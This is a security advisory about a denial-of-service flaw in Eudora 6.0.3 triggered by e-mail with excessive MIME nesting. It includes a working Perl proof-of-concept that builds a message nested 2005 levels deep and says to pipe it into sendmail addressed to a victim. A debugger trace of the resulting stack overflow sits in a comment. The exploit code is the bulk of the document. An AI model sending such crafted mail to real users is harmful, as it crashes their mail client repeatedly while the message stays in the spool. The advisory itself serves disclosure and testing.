source: http://www.securityfocus.com/bid/10137/info

It has been reported that Eudora is prone to a denial of service vulnerability when handling e-mail containing excessive MIME nesting. The problem is known to occur when the application attempts to decode the deeply nested message.

Successful exploitation of this issue may allow an attacker to cause the application to crash due to corruption of stack memory. It is not known if this issue is further exploitable to execute arbitrary code.

It should be noted that this condition may be persistent since the offending message may remain in the client's mail spool.

Eudora 6.0.3 is reported to be vulnerable to this issue, however, other versions may be affected as well.

#!/usr/bin/perl --

print "From: me\n";
print "To: you\n";
print "Subject: nested multipart test\n";
print "Mime-Version: 1.0\n";
print "X-Use: Pipe the output of this script into:  sendmail -i victim\n";

&nest(0);
print "\n";

sub nest {
  my ($x) = @_;
  my $b = sprintf("bndry%04d",$x);
  print "Content-Type: multipart/mixed; boundary=\"$b\"\n\n";
  print "--$b\n";
  print "Content-Type: text/plain\n\n";
  print "Level $x\n\n";

# No problem for 1995, but crash for 2005 deep nesting:
#
# (378.1c4): Stack overflow - code c00000fd (first chance)
# First chance exceptions are reported before any exception handling.
# This exception may be expected and handled.
# eax=00000409 ebx=00000001 ecx=00000000 edx=00000001 esi=000338a8 edi=62000000
# eip=77f862ed esp=00032f10 ebp=000337b0 iopl=0         nv up ei pl nz na pe nc
# cs=001b  ss=0023  ds=0023  es=0023  fs=0038  gs=0000             efl=00010202
# ntdll!LdrLoadAlternateResourceModule+9:
# 77f862ed 53               push    ebx

  if ($x < 2005) {
    print "--$b\n";
    &nest($x+1);
  }
  print "--$b\n";
  print "Content-Type: text/plain\n\n";
  print "Final $x\n";
  print "--$b--\n\n";
}